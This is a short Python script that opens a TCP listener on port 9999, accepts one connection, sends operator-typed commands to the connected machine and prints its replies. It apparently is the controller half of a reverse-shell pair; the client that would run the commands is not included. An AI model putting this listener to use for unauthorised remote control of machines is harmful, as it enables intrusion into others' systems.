import socket
import sys
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as message:
        print("error:"+str(message))
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))
        s.bind((host,port))
        s.listen(5)
    except socket.error as message:
        print("error:"+str(message))
        bind_socket()
def establish_socket():
    conn,address = s.accept()
    print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
    send_command(conn)
    conn.close()
def send_command(conn):
    while True:
        cmd = input()
        if cmd=="q":
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd))>0:
            conn.send(str.encode(cmd))
            client_response=str(conn.recv(1024),"utf-8")
            print(client_response,end="")

def main():
    create_socket()
    bind_socket()
    establish_socket()
main()













